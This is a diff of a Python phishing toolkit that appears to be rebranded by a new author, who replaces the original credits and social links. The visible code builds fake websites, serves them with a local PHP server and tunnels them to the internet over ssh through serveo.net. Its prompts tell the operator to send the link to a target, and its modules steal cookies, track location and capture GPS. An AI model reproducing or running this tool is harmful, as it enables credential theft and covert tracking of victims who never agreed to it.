@@ -1,11 +1,8 @@
 #-*-coding:utf-8-*-
-# Coded By Deray
+# Coded By kaito
 '''
 	 Rebuild Copyright Can't make u real programmer
 '''
-# Report Bug On My Other Sosmed
-# instagram: @reyy05_
-# facebook: https://facebook.com/achmad.luthfi.hadi.3
 
 import os
 import sys
@@ -34,7 +31,7 @@ class cek_required:
 				if "/ssh" in o:
 					pass
 				else:
-					sys.exit("%s[!]%s openssh not installed"%(R,N))
+					sys.exit(" %s[!]%s openssh not installed %s[!]%s \n %s[+]%s Please install it now %s[+]%s \n Command : pkg install openssh "%(R,N,R,N,R,N,R,N))
 				if "/php" in o:
 					break
 				else:
@@ -49,7 +46,7 @@ class phising():
 		self.a=raw_input("[%s+%s] Site Name: "%(G,N))
 		if (self.a == ""):
 			return self.ngentod()
-		print("[%s!%s] Please Wait Creating Fake Websites ..."%(G,N))
+		print("[%s!%s] Please Wait We will Creating Your Fake Websites ..."%(G,N))
 		self.generate()
 		
 	def generate(self):
@@ -61,7 +58,7 @@ class phising():
 						stdin=memek,stdout=memek
 			)
 			time.sleep(3)
-			print("[%s+%s] Open New Tab And Run %sasu.py%s select Server Listener"%(G,N,G,N))
+			print("[%s+%s] Open New Tab And Run %skaito.py%s select Server Listener"%(G,N,G,N))
 			print("[%s+%s] Send This Link On Your Target ."%(G,N))
 			print("[%s!%s] press '%syes%s' quickly if you find a question"%(G,N,G,N))
 			print("[%s!%s] waiting server active ..."%(G,N))
@@ -101,7 +98,7 @@ class locator():
 				b=raw_input("[%s+%s] Alert Msg  : "%(G,N))
 				d=raw_input("[%s+%s] HTML Body  : "%(G,N))
 				server.cookiejack(c,b,d)
-				print("[%s+%s] Please Wait Creating Fake Websites .."%(G,N))
+				print("[%s+%s] Please Wait Creating Your Fake Websites .."%(G,N))
 				with open("data/log.txt","w") as memek:
 					kontol.Popen(
 						["php","-S","localhost:8080","-t",
@@ -109,7 +106,7 @@ class locator():
 						stderr=memek,stdin=memek,stdout=memek
 					)
 					time.sleep(3)
-					print("[%s+%s] Open New Tab And Run %sasu.py%s select Server Listener"%(G,N,G,N))
+					print("[%s+%s] Open New Tab And Run %skaito.py%s select Server Listener"%(G,N,G,N))
 					print("[%s+%s] Send This Link On Your Target ."%(G,N))
 					print("[%s!%s] press '%syes%s' quickly if you find a question"%(G,N,G,N))
 					print("[%s!%s] waiting server active ..."%(G,N))
@@ -128,7 +125,7 @@ class locator():
 							os.system("killall php;killall ssh")
 			else:
 				self.a=raw_input("[%s+%s] Site Name  : "%(G,N))
-				print("[%s+%s] Please Wait Creating Fake Websites .."%(G,N))
+				print("[%s+%s] Please Wait Creating Your Fake Websites .."%(G,N))
 				with open("data/log.txt","w") as memek:
 					kontol.Popen(
 						["php","-S","localhost:8080","-t",
@@ -136,10 +133,10 @@ class locator():
 						stderr=memek,stdin=memek,stdout=memek
 					)
 					time.sleep(4)
-					print("[%s+%s] Open New Tab And Run %sasu.py%s select Server Listener"%(G,N,G,N))
+					print("[%s+%s] Open New Tab And Run %skaito.py%s select Server Listener"%(G,N,G,N))
 					print("[%s+%s] Send This Link On Your Target ."%(G,N))
 					print("[%s!%s] press '%syes%s' quickly if you find a question"%(G,N,G,N))
-					print("[%s!%s] waiting server active ..."%(G,N))
+					print("[%s!%s] Waiting server active ..."%(G,N))
 					kontol.Popen([
 							"ssh","-R",
 							"{}.serveo.net:80:localhost:8080".format(
@@ -176,14 +173,14 @@ class gps():
 				b=raw_input("[%s+%s] Alert Msg  : "%(G,N))
 				d=raw_input("[%s+%s] HTML Body  : "%(G,N))
 				server.gps(c,b,d)
-				print("[%s+%s] Please Wait Creating Fake Websites .."%(G,N))
+				print("[%s+%s] Please Wait Creating Your Fake Websites .."%(G,N))
 				with open("data/log.txt","w") as memek:
 					kontol.Popen(
 						["php","-S","localhost:8080","-t","raw/server/gps"],
 						stderr=memek,stdin=memek,stdout=memek
 					)
 					time.sleep(3)
-					print("[%s+%s] Open New Tab And Run %sasu.py%s select Server Listener"%(G,N,G,N))
+					print("[%s+%s] Open New Tab And Run %skaito.py%s select Server Listener"%(G,N,G,N))
 					print("[%s+%s] Send This Link On Your Target ."%(G,N))
 					print("[%s!%s] press '%syes%s' quickly if you find a question"%(G,N,G,N))
 					print("[%s!%s] waiting server active ..."%(G,N))
@@ -203,14 +200,14 @@ class gps():
 							os.system("killall php;killall ssh")
 			else:
 				self.a=raw_input("[%s+%s] Site Name  : "%(G,N))
-				print("[%s+%s] Please Wait Creating Fake Websites .."%(G,N))
+				print("[%s+%s] Please Wait Creating Your Fake Websites .."%(G,N))
 				with open("data/log.txt","w") as memek:
 					kontol.Popen(
 						["php","-S","localhost:8080","-t","raw/server/gps/"],
 						stderr=memek,stdin=memek,stdout=memek
 					)
 					time.sleep(4)
-					print("[%s+%s] Open New Tab And Run %sasu.py%s select Server Listener"%(G,N,G,N))
+					print("[%s+%s] Open New Tab And Run %skaito.py%s select Server Listener"%(G,N,G,N))
 					print("[%s+%s] Send This Link On Your Target ."%(G,N))
 					print("[%s!%s] press '%syes%s' quickly if you find a question"%(G,N,G,N))
 					print("[%s!%s] waiting server active ..."%(G,N))
